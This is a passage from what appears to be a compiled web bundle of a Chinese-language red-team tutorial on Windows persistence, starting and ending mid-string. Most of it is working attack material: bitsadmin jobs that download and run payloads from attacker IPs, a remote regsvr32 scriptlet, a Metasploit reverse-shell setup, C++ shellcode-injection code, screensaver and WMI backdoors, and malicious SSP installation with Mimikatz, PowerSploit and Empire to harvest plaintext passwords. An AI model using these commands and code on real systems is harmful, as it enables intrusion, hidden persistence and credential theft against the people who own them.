84\u4f20\u8f93\u80fd\u529b\u3002Microsoft\u63d0\u4f9b\u4e86\u4e00\u4e2a\u540d\u4e3a\u201c ",(0,r.jsx)(n.strong,{children:"bitsadmin"})," \u201d \u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u548cPowerShell cmdlet\uff0c\u7528\u4e8e\u521b\u5efa\u548c\u7ba1\u7406\u6587\u4ef6\u4f20\u8f93\u3002"]}),"\n",(0,r.jsxs)(n.p,{children:["\u4ece\u653b\u51fb\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u53ef\u4ee5\u6ee5\u7528\u6b64\u529f\u80fd\uff0c\u4ee5\u4fbf\u5728\u53d7\u611f\u67d3\u7684\u4e3b\u673a\u4e0a\u4e0b\u8f7dpayload\uff08\u53ef\u6267\u884c\u6587\u4ef6\uff0cPowerShell\u811a\u672c\uff0cScriptlet\u7b49\uff09\u5e76\u5728\u7ed9\u5b9a\u65f6\u95f4\u6267\u884c\u8fd9\u4e9b\u6587\u4ef6\uff0c\u4ee5\u5728\u7ea2\u961f\u64cd\u4f5c\u4e2d\u4fdd\u6301\u6301\u4e45\u6027\u3002\u4f46\u662f\uff0c\u4e0e\u201c ",(0,r.jsx)(n.strong,{children:"bitsadmin"})," \u201d \u8fdb\u884c\u4ea4\u4e92\u9700\u8981\u7ba1\u7406\u5458\u7ea7\u522b\u7684\u6743\u9650\u3002\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u4f1a\u5c06\u6076\u610fpayload\u4ece\u8fdc\u7a0b\u4f4d\u7f6e\u4e0b\u8f7d\u5230\u672c\u5730\u76ee\u5f55\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"window7\u4ee5\u4e0a\u81ea\u5e26"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'.\\bitsadmin.exe /transfer backdoor /download /priority high "http://192.168.1.106/CM.EXE" C:\\1.exe\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20210714142109258",src:s(49143).A+"",width:"3370",height:"1282"})}),"\n",(0,r.jsx)(n.p,{children:"\u6709\u4e00\u4e2aPowerShell cmdlet\u53ef\u4ee5\u6267\u884c\u76f8\u540c\u7684\u4efb\u52a1"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'Start-BitsTransfer -Source "http://10.0.2.21/pentestlab.exe" -Destination "C:\\tmp\\pentestlab.exe"\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(59614).A+"",width:"1024",height:"159"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5c06\u6587\u4ef6\u653e\u5165\u78c1\u76d8\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ece",(0,r.jsx)(n.code,{children:"bitsadmin"}),"\u5b9e\u7528\u7a0b\u5e8f\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u6765\u5b9e\u73b0\u6301\u4e45\u6027\u3002"]}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"\u5728\u521b\u5efa\u53c2\u6570\u9700\u8981\u4f5c\u4e1a\u7684\u540d\u79f0"}),"\n",(0,r.jsx)(n.li,{children:"\u8be5addfile\u9700\u8981\u6587\u4ef6\u7684\u8fdc\u7a0b\u4f4d\u7f6e\u548c\u672c\u5730\u8def\u5f84"}),"\n",(0,r.jsx)(n.li,{children:"\u8be5SetNotifyCmdLine\u5c06\u6267\u884c\u7684\u547d\u4ee4"}),"\n",(0,r.jsx)(n.li,{children:"\u6240\u8ff0SetMinRetryDelay\u5b9a\u4e49\u65f6\u95f4\u56de\u8c03\uff08\u79d2\uff09"}),"\n",(0,r.jsx)(n.li,{children:"\u6fc0\u6d3b\u4f20\u8f93\u961f\u5217\u4e2d\u7684\u65b0\u4f5c\u4e1a\u6216\u6302\u8d77\u7684\u4f5c\u4e1a"}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'bitsadmin /create backdoor\nbitsadmin /addfile backdoor "http://192.168.1.106/CM.EXE"  "C:\\1.exe"\nbitsadmin /SetNotifyCmdLine backdoor C:\\1.exe NUL\nbitsadmin /SetMinRetryDelay "backdoor" 60 \nbitsadmin /resume backdoor\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(97208).A+"",width:"1024",height:"703"})}),"\n",(0,r.jsxs)(n.p,{children:["\u53c2\u6570",(0,r.jsx)(n.strong,{children:"SetNotifyCmdLine"}),"\u4e5f\u53ef\u4ee5\u7528\u4e8e\u901a\u8fc7",(0,r.jsx)(n.a,{href:"https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/",children:"regsvr32"}),"\u5b9e\u7528\u7a0b\u5e8f\u4ece\u8fdc\u7a0b\u4f4d\u7f6e\u6267\u884cscriptlet \u3002\u8fd9\u79cd\u65b9\u6cd5\u7684\u597d\u5904\u662f\u5b83\u4e0d\u4f1a\u63a5\u89e6\u78c1\u76d8\uff0c\u5e76\u4e14\u53ef\u4ee5\u907f\u5f00\u5c06\u5e94\u7528\u7a0b\u5e8f\u5217\u5165\u767d\u540d\u5355\u7684\u4ea7\u54c1\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://10.0.2.21:8080/FHXSd9.sct scrobj.dll"\nbitsadmin /resume backdoor\n'})}),"\n",(0,r.jsxs)(n.p,{children:["Metasploit\u6846\u67b6\u53ef\u7528\u4e8e\u901a\u8fc7",(0,r.jsx)(n.code,{children:"web_delivery"}),"\u6a21\u5757\u6355\u83b7payload\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"use exploit/multi/script/web_delivery\nset target 3\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST 10.0.2.21\nexploit\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"BITS Jobs \u2013 Regsvr32",src:s(37544).A+"",width:"777",height:"426"})}),"\n",(0,r.jsx)(n.h2,{id:"\u8fdb\u7a0b\u6ce8\u5165",children:"\u8fdb\u7a0b\u6ce8\u5165"}),"\n",(0,r.jsx)(n.p,{children:"\u4e4b\u6240\u4ee5\u628a\u6ce8\u5165\u4e5f\u653e\u5230\u6743\u9650\u7ef4\u6301\u6765\u8bf4,\u56e0\u4e3a\u6ce8\u5165\u66f4\u52a0\u9690\u853d,\u5c24\u5176\u662f\u62ff\u5230\u9ad8\u6743\u9650\u540e,\u96be\u4ee5\u88ab\u53d1\u73b0"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"\u5982\u679c\u662fuser\u6743\u9650\u53ef\u4ee5\u8003\u8651\u6ce8\u5165exploer.exe \u5982\u679c\u662fsystem\u6743\u9650\u5219\u53ef\u4ee5\u6ce8\u5165winlogon\u6216\u8005lassa"})}),"\n",(0,r.jsx)(n.p,{children:"\u5173\u4e8edll\u6ce8\u5165\u7f51\u4e0a\u5df2\u7ecf\u6709\u5f88\u591a\u6559\u7a0b,\u5305\u62ec\u7a81\u7834session 0,\u4f7f\u7528ZwCreateThreadEx\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b"}),"\n",(0,r.jsx)(n.p,{children:"\u540c\u6837\u8fd8\u6709shellcode\u6ce8\u5165"}),"\n",(0,r.jsx)(n.p,{children:"\u4e00\u4e2ademo"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-C++",children:'DWORD CeatRemoThread(DWORD pid)\n{\nHANDLE hThread;\nDWORD dwOldProtect;\nDWORD dwThreadId;\nint shellcode_size = sizeof(buf);\n//\u6df7\u6dc6\nchar* newBuf;\n\n\ndecrypt(buf, shellcode_size, (LPVOID*)&newBuf);\n\n\nHANDLE hHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);\nif (hHandle == NULL)\n{\nprintf("openprocessError");\nfree(newBuf);\nreturn FALSE;\n}\nLPVOID Memory = VirtualAllocEx(hHandle, NULL, sizeof(newBuf) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n\n\nSIZE_T dwSize = 0;\nWriteProcessMemory(hHandle, Memory, newBuf, shellcode_size / 3, &dwSize);\n//Sleep(3000);\nVirtualProtectEx(hHandle, Memory, shellcode_size / 3, PAGE_EXECUTE, &dwOldProtect);\n\n\n\n\nHMODULE hNtdll = LoadLibrary(L"ntdll.dll");\nif (hNtdll == NULL)\n{\nprintf("[!] LoadNTdll Error,Error is:%d\\n", GetLastError());\nreturn FALSE;\n}\nelse\n{\nprintf("[*] Load ntdll.dll Successfully!\\n");\n}\n#ifdef _WIN64\ntypedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(\nPHANDLE ThreadHandle,\nACCESS_MASK DesiredAccess,\nLPVOID ObjectAttributes,\nHANDLE ProcessHandle,\nLPTHREAD_START_ROUTINE lpStartAddress,\nLPVOID lpParameter,\nULONG CreateThreadFlags,\nSIZE_T ZeroBits,\nSIZE_T StackSize,\nSIZE_T MaximumStackSize,\nLPVOID pUnkown\n);\n#else\ntypedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(\nPHANDLE ThreadHandle,\nACCESS_MASK DesiredAccess,\nLPVOID ObjectAttributes,\nHANDLE ProcessHandle,\nLPTHREAD_START_ROUTINE lpStartAddress,\nLPVOID lpParameter,\nBOOL CreateSuspended,\nDWORD dwStackSize,\nDWORD dw1,\nDWORD dw2,\nLPVOID pUnkown\n);\n#endif\ntypedef_ZwCreateThreadEx ZwCreateThreadEx = NULL;\nZwCreateThreadEx = (typedef_ZwCreateThreadEx)::GetProcAddress(hNtdll, "ZwCreateThreadEx");\n\n\nif (ZwCreateThreadEx == NULL)\n{\nprintf("[!] Get ZwCreateThreadEx Address Error,Error is:%d\\n", GetLastError());\nreturn FALSE;\n}\nelse\n{\nprintf("[*] Get ZwCreateThreadEx Address Successfully! Address is %x\\n", ZwCreateThreadEx);\n}\nHANDLE hRemoteThread = NULL;\nDWORD ZwRet = 0;\nZwRet = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hHandle,\n(LPTHREAD_START_ROUTINE)Memory, NULL, 0, 0, 0, 0, NULL);\n\n\nif (hRemoteThread == NULL)\n{\nprintf("[!] Creat RemoteThread Error,Error is:%d\\n", GetLastError());\ngetchar();\nVirtualFreeEx(hHandle, Memory, 0, MEM_RELEASE);\nCloseHandle(hHandle);\nFreeLibrary(hNtdll);\nreturn FALSE;\n}\nWaitForSingleObject(hRemoteThread, INFINITE);\n\n\nreturn TRUE;\n}\n'})}),"\n",(0,r.jsx)(n.h2,{id:"\u5c4f\u5e55\u4fdd\u62a4\u7a0b\u5e8f",children:"\u5c4f\u5e55\u4fdd\u62a4\u7a0b\u5e8f"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"\u5229\u7528\u524d\u63d0:\u5bf9\u65b9\u5f00\u542f\u4e86\u5c4f\u5e55\u4fdd\u62a4"})}),"\n",(0,r.jsx)(n.p,{children:"\u5c4f\u5e55\u4fdd\u62a4\u7a0b\u5e8f\uff0c\u5f53\u521d\u7684\u8bbe\u8ba1\u662f\u4e3a\u4e86\u9632\u6b62\u957f\u671f\u5c4f\u5e55\u7684\u663e\u793a\uff0c\u9884\u9632\u8001\u5316\u4e0e\u7f29\u77ed\u5c4f\u5e55\u663e\u793a\u5668\u8001\u5316\u7684\u4e00\u79cd\u4fdd\u62a4\u7a0b\u5e8f\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u5bf9\u65b9\u5f00\u542f\u5c4f\u5e55\u4fdd\u62a4\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u5c4f\u4fdd\u7a0b\u5e8f\u4e3a\u6211\u4eec\u7684\u6076\u610f\u7a0b\u5e8f\u4ece\u800c\u8fbe\u5230\u540e\u95e8\u6301\u4e45\u5316\u7684\u76ee\u7684\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u5c4f\u5e55\u4fdd\u62a4\u7a0b\u5e8f\u6765\u9690\u85cfshell\uff0c\u8fbe\u5230\u4e00\u5b9a\u7684\u6743\u9650\u7ef4\u6301\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u6ce8\u518c\u8868\u4f4d\u7f6e:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"HKEY_CURRENT_USER\\Control Panel\\Desktop\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u547d\u4ee4\u884c\u4fee\u6539:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /d C:\\Windows\\System32\\cmd.exe\nNew-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop\\' -Name 'SCRNSAVE.EXE' -Value 'c:\\tmp\\pentestlab.exe'\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u56fe\u7247",src:s(86965).A+"",width:"1067",height:"538"})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u91cc\u53ef\u4ee5\u6539\u6210\u6211\u4eec\u7684\u9a6c\uff0c\u8fbe\u5230\u7ef4\u6301\u6743\u9650\u7684\u6548\u679c,\u5177\u4f53\u65f6\u95f4\u4e3a\u6ce8\u518c\u8868\u7684ScreenSaverTimeout\u503c\u6709\u5173"}),"\n",(0,r.jsx)(n.h2,{id:"wmi\u6784\u9020\u65e0\u6587\u4ef6\u540e\u95e8",children:"WMI\u6784\u9020\u65e0\u6587\u4ef6\u540e\u95e8"}),"\n",(0,r.jsx)(n.p,{children:"WMI\u662f\u4e00\u9879Windows\u7ba1\u7406\u6280\u672f\uff0c\u5176\u5168\u79f0\u662fWindows Management Instrumentation\uff0c\u5373Windows\u7ba1\u7406\u89c4\u8303\u3002\u5927\u591a\u6570\u57fa\u4e8eWindows\u7684\u8f6f\u4ef6\u4f9d\u8d56\u4e8e\u6b64\u670d\u52a1\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u65e0\u6587\u4ef6\u65e0\u8fdb\u7a0b\u4f7f\u5f97\u4ed6\u975e\u5e38\u9690\u853d\u6210\u4e3a\u540e\u95e8\uff0c\u4f46\u7531\u4e8e\u4ed6\u7684\u9690\u853d\u6027\u73b0\u5728\u88ab\u5927\u591a\u6570\u6740\u8f6f\u6240\u67e5\u6740\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u901a\u8fc7\u4e0ePowershell\u547d\u4ee4\u914d\u5408\u4f7f\u7528\u53ef\u4ee5\u5b9e\u73b0\u65e0\u6587\u4ef6\uff0c\u5177\u6709\u826f\u597d\u7684\u9690\u853d\u6027\u4e5f\u662f\u76ee\u524d\u8f83\u4e3a\u5e38\u7528\u7684\u6301\u4e45\u5316\u624b\u6bb5\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u63a8\u8350\u6587\u7ae0"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"https://wooyun.js.org/drops/WMI%20%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%8C%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E4%B9%8B%E6%94%BB%E5%87%BB%E7%AF%87.html",children:"https://wooyun.js.org/drops/WMI%20%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%8C%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E4%B9%8B%E6%94%BB%E5%87%BB%E7%AF%87.html"})}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'$filterName = \'SD\'\n$consumerName = \'SDD\'\n$exePath = \'C:\\Windows\\System32\\cmd.exe\'\n$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\' AND TargetInstance.SystemUpTime >=200 AND TargetInstance.SystemUpTime < 320"\n$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop\n$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath}\nSet-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u53ef\u4ee5\u4f7f\u7528Autoruns\u8fdb\u884c\u67e5\u770b"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u56fe\u7247",src:s(78499).A+"",width:"1080",height:"551"})}),"\n",(0,r.jsx)(n.h2,{id:"\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u8005",children:"\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u8005"}),"\n",(0,r.jsx)(n.p,{children:"\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\uff08SSP\uff09\u662fWindows API\uff0c\u7528\u4e8e\u6269\u5c55Windows\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\u3002LSASS\u8fdb\u7a0b\u6b63\u5728Windows\u542f\u52a8\u671f\u95f4\u52a0\u8f7d\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8fDLL\u3002\u8fd9\u79cd\u884c\u4e3a\u4f7f\u7ea2\u961f\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5220\u9664\u4e00\u4e2a\u4efb\u610f\u7684SSP DLL\u4ee5\u4fbf\u4e0eLSASS\u8fdb\u7a0b\u8fdb\u884c\u4ea4\u4e92\u5e76\u8bb0\u5f55\u8be5\u8fdb\u7a0b\u4e2d\u5b58\u50a8\u7684\u6240\u6709\u5bc6\u7801\uff0c\u6216\u8005\u76f4\u63a5\u7528\u6076\u610f\u7684SSP\u5bf9\u8be5\u8fdb\u7a0b\u8fdb\u884c\u4fee\u8865\u800c\u65e0\u9700\u63a5\u89e6\u78c1\u76d8\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u8be5\u6280\u672f\u53ef\u7528\u4e8e\u6536\u96c6\u4e00\u4e2a\u7cfb\u7edf\u6216\u591a\u4e2a\u7cfb\u7edf\u4e2d\u7684\u51ed\u636e\uff0c\u5e76\u5c06\u8fd9\u4e9b\u51ed\u636e\u4e0e\u53e6\u4e00\u4e2a\u534f\u8bae\uff08\u4f8b\u5982RDP\uff0cWMI\u7b49\uff09\u7ed3\u5408\u4f7f\u7528\uff0c\u4ee5\u514d\u5e72\u6270\u68c0\u6d4b\uff0c\u4ece\u800c\u5728\u7f51\u7edc\u4e2d\u4fdd\u6301\u6301\u4e45\u6027\u3002\u5411\u4e3b\u673a\u6ce8\u5165\u6076\u610f\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\u9700\u8981\u7ba1\u7406\u5458\u7ea7\u522b\u7684\u7279\u6743\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f7f\u7528\u4e24\u79cd\u65b9\u6cd5\uff1a"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"\u6ce8\u518cSSP DLL"}),"\n",(0,r.jsx)(n.li,{children:"\u52a0\u8f7d\u5230\u5185\u5b58"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"Mimikatz\uff0cEmpire\u548cPowerSploit\u652f\u6301\u8fd9\u4e24\u79cd\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5728\u7ea2\u961f\u64cd\u4f5c\u4e2d\u4f7f\u7528\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"mimikatz",children:"Mimikatz"}),"\n",(0,r.jsx)(n.h4,{id:"\u65b9\u6cd5\u4e00",children:"\u65b9\u6cd5\u4e00"}),"\n",(0,r.jsxs)(n.p,{children:["\u9879\u76ee",(0,r.jsx)(n.a,{href:"https://github.com/gentilkiwi/mimikatz/releases",children:"Mimikatz"}),"\u63d0\u4f9b\u4e86\u4e00\u4e2aDLL\u6587\u4ef6\uff08mimilib.dll\uff09\uff0c\u53ef\u4ee5\u5c06\u5176\u653e\u5230\u4e0eLSASS\u8fdb\u7a0b\uff08System32 \uff09\u76f8\u540c\u7684\u4f4d\u7f6e\uff0c\u4ee5\u4fbf\u4e3a\u8bbf\u95ee\u53d7\u611f\u67d3\u4e3b\u673a\u7684\u4efb\u4f55\u7528\u6237\u83b7\u5f97\u7eaf\u6587\u672c\u51ed\u636e\u3002"]}),"\n",(0,r.jsxs)(n.p,{children:["\u5c06\u6587\u4ef6\u4f20\u8f93\u5230",(0,r.jsx)(n.code,{children:"C:\\Windows\\System32\\"}),"\u4f4d\u7f6e\u540e\uff0c\u9700\u8981\u4fee\u6539\u6ce8\u518c\u8868\u9879\u4ee5\u5305\u62ec\u65b0\u7684\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f",(0,r.jsx)(n.code,{children:"mimilib"}),"\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'reg add "hklm\\system\\currentcontrolset\\control\\lsa\\" /v "Security Packages" /d "kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib" /t REG_MULTI_SZ\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(50465).A+"",width:"1024",height:"268"})}),"\n",(0,r.jsx)(n.p,{children:"\u67e5\u770b\u201c\u5b89\u5168\u8f6f\u4ef6\u5305\u201d\u6ce8\u518c\u8868\u9879\u5c06\u9a8c\u8bc1\u662f\u5426\u5df2\u6ce8\u5165\u6076\u610f\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(82636).A+"",width:"1024",height:"564"})}),"\n",(0,r.jsx)(n.p,{children:"\u7531\u4e8e\u6ce8\u518c\u8868\u5df2\u88ab\u7be1\u6539\u5e76\u4e14DLL\u5b58\u50a8\u5728\u7cfb\u7edf\u4e2d\uff0c\u56e0\u6b64\u8be5\u65b9\u6cd5\u5c06\u5728\u91cd\u65b0\u542f\u52a8\u540e\u7ee7\u7eed\u5b58\u5728\u3002\u5f53\u57df\u7528\u6237\u518d\u6b21\u901a\u8fc7\u7cfb\u7edf\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u65f6\uff0c\u5c06\u521b\u5efa\u4e00\u4e2a\u540d\u4e3akiwissp\u7684\u65b0\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u5c06\u8bb0\u5f55\u5e10\u6237\u7684\u51ed\u636e\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"C:\\Windows\\System32\\kiwissp.log\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(33478).A+"",width:"1024",height:"477"})}),"\n",(0,r.jsx)(n.h4,{id:"\u65b9\u6cd5\u4e8c",children:"\u65b9\u6cd5\u4e8c"}),"\n",(0,r.jsx)(n.p,{children:"Mimikatz\u901a\u8fc7\u5411LSASS\u6ce8\u5165\u65b0\u7684\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\uff08SSP\uff09\u6765\u652f\u6301\u5185\u5b58\u6280\u672f\u9009\u9879\u3002\u6b64\u6280\u672f\u4e0d\u9700\u8981\u5c06mimilib.dll\u653e\u5165\u78c1\u76d8\u6216\u521b\u5efa\u6ce8\u518c\u8868\u9879\u3002\u4f46\u662f\uff0c\u7f3a\u70b9\u662f\u5728\u91cd\u65b0\u542f\u52a8\u8fc7\u7a0b\u4e2d\u4e0d\u4f1a\u6301\u7eed\u5b58\u5728\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"privilege::debug\nmisc::memssp\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(69194).A+"",width:"1024",height:"525"})}),"\n",(0,r.jsx)(n.p,{children:"\u5f53\u7528\u6237\u518d\u6b21\u901a\u8fc7\u7cfb\u7edf\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u65f6\uff0c\u5c06\u5728System32\u4e2d\u521b\u5efa\u4e00\u4e2a\u65e5\u5fd7\u6587\u4ef6\uff0c\u5176\u4e2d\u5c06\u5305\u542b\u7eaf\u6587\u672c\u7528\u6237\u5bc6\u7801\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"C:\\Windows\\System32\\mimilsa.log\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(48920).A+"",width:"1008",height:"471"})}),"\n",(0,r.jsx)(n.h3,{id:"powersploit-1",children:"PowerSploit"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.a,{href:"https://github.com/PowerShellMafia/PowerSploit",children:"PowerSploit"}),"\u5305\u542b\u4e24\u4e2a\u53ef\u4ee5\u6267\u884c\u76f8\u540c\u4efb\u52a1\u7684\u811a\u672c\u3002\u5728Mimikatz\u7684PowerShell\u53d8\u4f53\u201c ",(0,r.jsx)(n.strong,{children:"Invoke-Mimikatz"})," \u201d\u4e2d\uff0c\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u5c06\u4f7f\u7528\u5185\u5b58\u4e2d\u6280\u672f\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'Import-Module .\\Invoke-Mimikatz.ps1\nInvoke-Mimikatz -Command "misc::memssp"\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"PowerSploit \u2013 Mimikatz SSP",src:s(84841).A+"",width:"797",height:"392"})}),"\n",(0,r.jsxs)(n.p,{children:["\u6216\u8005\uff0c\u5c06\u6076\u610f\u7684SSP DDL\u6587\u4ef6\u4f20\u8f93\u5230\u76ee\u6807\u4e3b\u673a\u5e76\u4f7f\u7528\u6a21\u5757",(0,r.jsx)(n.strong,{children:"Install-SSP"}),"\u5c06DLL\u590d\u5236\u5230System32\uff0c\u5e76\u5c06\u81ea\u52a8\u4fee\u6539\u76f8\u5173\u7684\u6ce8\u518c\u8868\u9879\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"Import-Module .\\PowerSploit.psm1\nInstall-SSP -Path .\\mimilib.dll\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"PowerSploit \u2013\u5b89\u88c5SSP",src:s(26493).A+"",width:"797",height:"292"})}),"\n",(0,r.jsx)(n.h3,{id:"empire-2",children:"Empire"}),"\n",(0,r.jsx)(n.p,{children:"Empire\u63d0\u4f9b\u4e86\u4e24\u4e2a\u6a21\u5757\uff0c\u53ef\u7528\u4e8e\u679a\u4e3e\u73b0\u6709\u7684SSP\u5e76\u5728\u76ee\u6807\u7cfb\u7edf\u4e0a\u5b89\u88c5\u6076\u610f\u7684SSP\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u679a\u4e3e\u6a21\u5757\u5c06\u4f7f\u7528\u6d3b\u52a8\u4ee3\u7406\uff0c\u5e76\u4e14\u4e0d\u9700\u8981\u4efb\u4f55\u5176\u4ed6\u914d\u7f6e\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"usemodule persistence/misc/get_ssps\nexecute\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Empire \u2013 SSP \u679a\u4e3e",src:s(52642).A+"",width:"1024",height:"379"})}),"\n",(0,r.jsx)(n.p,{children:"\u540c\u6837\uff0c\u76f4\u63a5\u67e5\u8be2\u6ce8\u518c\u8868\u53ef\u4ee5\u83b7\u53d6\u5b58\u5728\u7684SSP\u7684\u503c\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'shell reg query hklm\\system\\currentcontrolset\\control\\lsa\\ /v "Security Packages"\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u6ce8\u518c\u8868SSP\u7684\u679a\u4e3e\u6ce8\u518c\u8868",src:s(3122).A+"",width:"928",height:"198"})}),"\n",(0,r.jsx)(n.p,{children:"\u5c06\u6076\u610f\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\u590d\u5236\u5230System32\u5e76\u66f4\u65b0\u6ce8\u518c\u8868\u9879\u5c06\u7ed3\u675f\u8be5\u6280\u672f\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"shell copy mimilib.dll 